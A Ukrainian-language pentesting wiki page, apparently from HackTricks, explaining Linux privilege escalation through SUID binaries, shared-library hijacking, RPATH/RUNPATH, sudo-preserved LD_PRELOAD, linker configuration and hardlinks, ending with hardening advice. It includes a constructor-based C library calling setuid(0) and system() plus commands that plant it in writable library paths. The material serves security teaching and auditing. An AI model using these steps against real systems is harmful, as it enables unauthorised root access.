# Зловживання SUID, спільними бібліотеками та лінкером

{{#include ../../banners/hacktricks-training.md}}

SUID-бінарні файли зазвичай перевіряють на можливість прямого виконання команд, але власні SUID-програми також можуть бути вразливими через динамічний лінкер. Загальна ідея проста: привілейований executable завантажує code із шляху або конфігурації, на які користувач із нижчими привілеями може впливати.

Ця сторінка зосереджена на загальних шаблонах технік: відсутні бібліотеки, директорії бібліотек із доступом на запис, `RPATH`/`RUNPATH`, `LD_PRELOAD` через sudo, конфігурація лінкера та плутанина із SUID hardlink.

## Швидкий збір даних

Почніть із пошуку незвичних SUID-файлів і перевірте, чи використовують вони динамічне компонування:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Зосередьтеся на нестандартних розташуваннях, шляхах користувацьких застосунків, бінарних файлах, власником яких є root, але які розташовані поза каталогами, що керуються пакетним менеджером, а також залежностях, завантажених із каталогів, доступних для запису.

Корисні перевірки доступності для запису:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Деякі власні SUID-бінарники намагаються завантажити shared object, якого не існує. Якщо відсутній шлях знаходиться в каталозі, контрольованому attacker, бінарник може завантажити код, наданий attacker, із правами effective user.

Знайдіть невдалі спроби пошуку бібліотек:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Якщо бінарний файл шукає `libexample.so` у доступному для запису шляху, мінімальна proof-бібліотека може використовувати конструктор. Під час перевірки зберігайте proof-of-impact нешкідливим:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Зберіть його з точною назвою файлу, який намагається завантажити бінарний файл:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Експлуатованою умовою є не лише відсутня бібліотека. Зловмисник має мати можливість розмістити сумісний shared object за шляхом, який прийме привілейований завантажувач.

## Записуваний каталог бібліотек

Іноді всі залежності існують, але один із каталогів, що використовуються для їхнього пошуку, доступний для запису. Це може дозволити замінити завантажену бібліотеку або розмістити бібліотеку з вищим пріоритетом із таким самим ім’ям.

Перевірте шляхи залежностей:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Якщо каталог доступний для запису, перевірте це в лабораторному середовищі за допомогою безпечного підходу з копіюванням. Заміна системних бібліотек на активному хості може порушити автентифікацію, керування пакетами або критично важливі служби завантаження.

## RPATH і RUNPATH

`RPATH` і `RUNPATH` — це записи динамічної секції, які вказують завантажувачу, де шукати бібліотеки. Вони небезпечні в SUID-програмах, якщо вказують на каталоги, доступні зловмиснику для запису.

Виявлення:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Приклад ризикованого виводу:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Якщо `/opt/app/lib` доступний для запису, а бінарний файл потребує `libcustom.so`, зловмисник може розмістити там шкідливий `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` і `RUNPATH` не є ідентичними в усіх деталях пошуку, але під час перевірки privilege-escalation практичне питання залишається тим самим: чи шукає SUID-бінарник library name у директорії, доступній для запису attacker'у?

## LD_PRELOAD, LD_LIBRARY_PATH і SUID

Для звичайних програм `LD_PRELOAD` і `LD_LIBRARY_PATH` можуть примусово виконувати або впливати на завантаження shared object. Для SUID-програм dynamic loader зазвичай переходить у secure-execution mode та ігнорує небезпечні environment variables.

Це означає, що звичайний SUID-бінарник зазвичай не є вразливим лише через те, що користувач може встановити `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Поширеним винятком є неправильна конфігурація sudo. Якщо `sudo -l` показує, що зберігається така змінна, як `LD_PRELOAD` або `LD_LIBRARY_PATH`, команда, дозволена sudo, може завантажити код під контролем атакувальника:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Не плутайте ці випадки:

- `LD_PRELOAD` проти звичайного SUID binary: зазвичай блокується secure execution.
- `LD_PRELOAD`, збережений sudo: потенційно exploitable.
- Відсутній `.so` у writable path: exploitable, коли SUID binary природним чином завантажує цей path.
- `RPATH`/`RUNPATH` до writable directory: exploitable, коли потрібною library можна керувати.
- Доступ на запис до `/etc/ld.so.preload` або linker config: системний і має значний вплив.

## Конфігурація linker

Dynamic linker також читає system configuration, наприклад `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache і, у деяких випадках, `/etc/ld.so.preload`.

Важливі перевірки:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.

## SUID Hardlink Confusion

Hardlinks can make the same SUID inode appear under multiple names. This is useful for hiding a privileged helper, confusing cleanup, or bypassing naive path-based review.

Find SUID files with more than one link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Перевірте всі шляхи до того самого inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Зловживання полягає не в тому, що hardlink змінює дозволи. Зловживання полягає в path confusion: привілейований inode може бути доступний через ім’я, якого захисники або скрипти не очікують. Докладніше про inode та workflow із hardlink див. [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Захисні примітки

- Зберігайте SUID-бінарні файли мінімальними, перевіреними та, де можливо, керованими через пакетний менеджер.
- Уникайте записів `RPATH`/`RUNPATH`, що вказують на доступні для запису або керовані застосунками директорії.
- Директорії бібліотек мають належати root і бути недоступними для запису звичайним користувачам.
- Не зберігайте `LD_PRELOAD`, `LD_LIBRARY_PATH` або подібні змінні loader через sudo.
- Відстежуйте `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` і неочікувані SUID-файли.
- Перевіряйте hardlinked SUID-файли та досліджуйте custom SUID wrappers за межами стандартних системних шляхів.
{{#include ../../banners/hacktricks-training.md}}
